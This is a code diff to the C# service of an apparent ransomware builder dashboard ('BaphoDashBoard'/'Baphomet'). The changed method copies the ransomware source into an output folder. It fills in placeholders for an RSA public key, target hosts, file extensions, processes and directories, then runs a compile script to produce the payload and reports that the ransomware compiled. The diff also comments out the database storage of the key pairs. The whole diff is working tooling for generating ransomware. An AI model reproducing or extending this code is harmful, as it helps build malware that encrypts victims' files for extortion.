@@ -190,8 +190,8 @@ namespace BaphoDashBoard.DAL.Services
                         PublicKey = rsa_keys.PublicKey,
                         PrivateKey = rsa_keys.PrivateKey
                     };
-                     _context.Ransomware.Add(ransomware);
-                      await _context.SaveChangesAsync();
+                   //  _context.Ransomware.Add(ransomware);
+                   //   await _context.SaveChangesAsync();
 
                     result.message = "Your ransomare has been compiled successfully!";
                 }
@@ -211,21 +211,26 @@ namespace BaphoDashBoard.DAL.Services
             try
             { 
                 var getpath = Directory.GetCurrentDirectory();
-                var main_path = getpath.Remove(getpath.Length - 15);
-                main_path = Path.Combine(main_path, "Tools","Baphomet");
+                DirectoryInfo fullpath = new DirectoryInfo(getpath);
+                var main_path = fullpath.Parent.FullName;
+                var output_path = Path.Combine(main_path, "Tools", "output","Baphomet");
+                main_path = Path.Combine(main_path, "Tools", "Baphomet");
 
-                var draw_rsa_key = await DrawParameters(Path.Combine(main_path, "Utilities"), "CryptRSA.cs", "<public key here>", model);
-                var draw_host_list = await DrawParameters(Path.Combine(main_path, "Utilities"), "NetInfo.cs", "<host list here>", model);
-                var draw_extensions = await DrawParameters(Path.Combine(main_path, "Utilities"), "Crypt.cs", "<extensions list here>", model);
-                var draw_processes = await DrawParameters(Path.Combine(main_path, "Utilities"), "Diagnostics.cs", "<processes list here>", model);
-                var draw_dirs = await DrawParameters(main_path, "Program.cs", "<dirs list here>", model);
+                DirectoryInfo sourceDir = new DirectoryInfo(main_path);
+                DirectoryInfo destinationDir = new DirectoryInfo(output_path);
 
-                if(draw_rsa_key.success == true && draw_host_list.success == true && draw_extensions.success == true && draw_processes.success == true && draw_dirs.success == true)
+                CopyDirectory(sourceDir, destinationDir);
+                var draw_rsa_key = await DrawParameters(Path.Combine(output_path, "Utilities"), "CryptRSA.cs", "<public key here>", model);
+                var draw_host_list = await DrawParameters(Path.Combine(output_path, "Utilities"), "NetInfo.cs", "<host list here>", model);
+                var draw_extensions = await DrawParameters(Path.Combine(output_path, "Utilities"), "Crypt.cs", "<extensions list here>", model);
+                var draw_processes = await DrawParameters(Path.Combine(output_path, "Utilities"), "Diagnostics.cs", "<processes list here>", model);
+                var draw_dirs = await DrawParameters(output_path, "Program.cs", "<dirs list here>", model);
+
+                if (draw_rsa_key.success == true && draw_host_list.success == true && draw_extensions.success == true && draw_processes.success == true && draw_dirs.success == true)
                 {
-                    var strCmdText = "/K cd " + main_path + " & compile.bat";
+                    var strCmdText = "/K cd " + output_path + " & compile.bat";
                     Process.Start("CMD.exe", strCmdText).WaitForExit();
                 }
-              
             }
             catch(Exception ex)
             {
@@ -233,6 +238,37 @@ namespace BaphoDashBoard.DAL.Services
                 result.message = ex.Message;
             }
             return result;
+        }
+
+        static void CopyDirectory(DirectoryInfo sourceDir, DirectoryInfo destinationDir)
+        {
+            try
+            {
+                if (!destinationDir.Exists)
+                {
+                    destinationDir.Create();
+                }
+                else
+                {
+                    Directory.Delete(destinationDir.Parent.FullName,true);
+                    destinationDir.Create();
+                }
+                FileInfo[] files = sourceDir.GetFiles();
+                foreach (FileInfo file in files)
+                {
+                    file.CopyTo(Path.Combine(destinationDir.FullName, file.Name));
+                }
+                DirectoryInfo[] dirs = sourceDir.GetDirectories();
+                foreach (DirectoryInfo dir in dirs)
+                {
+                    string destination = Path.Combine(destinationDir.FullName, dir.Name);
+                    CopyDirectory(dir, new DirectoryInfo(destination));
+                }
+            }
+            catch(Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
         }
 
         public async Task<AppResult> DrawParameters(string file_path, string file, string refence_value, GenerateRansomwareDTO model)
